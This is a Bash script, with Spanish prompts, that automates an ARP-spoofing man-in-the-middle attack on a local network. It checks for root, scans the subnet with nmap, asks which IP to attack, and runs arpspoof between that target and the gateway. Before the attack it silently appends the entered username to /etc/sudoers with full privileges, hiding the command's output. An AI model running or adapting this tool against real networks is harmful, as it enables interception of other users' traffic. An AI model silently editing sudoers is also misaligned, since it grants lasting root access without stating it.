#!/bin/bash

# Author: Diego Vargas (f1rul4yx)

# Colors
negrita="\033[1m"
subrayado="\033[4m"
negro="\033[30m"
rojo="\033[31m"
verde="\033[32m"
amarillo="\033[33m"
azul="\033[34m"
magenta="\033[35m"
cian="\033[36m"
blanco="\033[37m"
reset="\033[0m"

# Functions
function logo() {
    clear
    echo -e '                  ______'
    echo -e '               .-"      "-.'
    echo -e '              /            \'
    echo -e '  _          |              |          _'
    echo -e ' ( \         |,  .-.  .-.  ,|         / )'
    echo -e '  > "=._     | )(__/  \__)( |     _.=" <'
    echo -e ' (_/"=._"=._ |/     /\     \| _.="_.="\_)'
    echo -e '        "=._ (_     ^^     _)"_.="'
    echo -e '            "=\__|IIIIII|__/="'
    echo -e '    __ _            _ _  _'
    echo -e '   / _/ |_ __ _   _| | || |  _   ___  __'
    echo -e "  | |_| | '__| | | | | || |_| | | \ \/ /"
    echo -e '  |  _| | |  | |_| | |__   _| |_| |>  <'
    echo -e '  |_| |_|_|   \__,_|_|  |_|  \__, /_/\_\'
    echo -e '                             |___/'
    echo -e '           _.="| \IIIIII/ |"=._'
    echo -e ' _     _.="_.="\          /"=._"=._     _'
    echo -e '( \_.="_.="     `--------`     "=._"=._/ )'
    echo -e ' > _.="                            "=._ <'
    echo -e '(_/                                    \_)\n\n'
}
function root_verification() {
    logo
    if [ "$EUID" -ne 0 ]; then
        echo -e "${negrita}${rojo}Este script debe ser ejecutado como usuario root${reset}"
        exit 1
    fi
}
function username() {
    logo
    echo -e "${negrita}Escribe tu nombre de usuario perfectamente:${reset} \c"
    read username
}
function sudoers() {
    logo
    if ! grep "${username}" /etc/sudoers; then
        echo -e "${username}    ALL=(ALL:ALL) ALL" >> /etc/sudoers
    fi &>/dev/null
}
function question1() {
    logo
    ip addr show | awk '/^[0-9]+:/ { interface=$2; next } /inet / { print interface, $2 }'
    echo -e "\n${negrita}Inserte el nombre de la tarjeta de red:${reset} \c"
    read question1
    ip_network=$(ip route show dev ${question1} | awk '/proto kernel/ {print $1}')
    gateway=$(ip route show dev ${question1} | awk '/default/ {print $3}')
}
function question2() {
    logo
    echo -e "${negrita}¿Quieres realizar un escaneo de la red para ver los dispositivos? (1=yes 2=no):${reset} \c"
    read question2
    case ${question2} in
        1)
            logo
            sudo nmap ${ip_network}
            echo -e "\n\n${negrita}${verde}Pulsa ENTER para continuar...${reset}"
            read
            ;;
        2)
            ;;
        *)
            question2
            ;;
    esac
}
function question3() {
    logo
    echo -e "${negrita}¿Qué dirección ip quieres atacar?${reset} \c"
    read question3
}
function ataque() {
    logo
    sudo arpspoof -i "${question1}" -t "${question3}" "${gateway}"
}

# Program
root_verification
username
sudoers
question1
question2
question3
ataque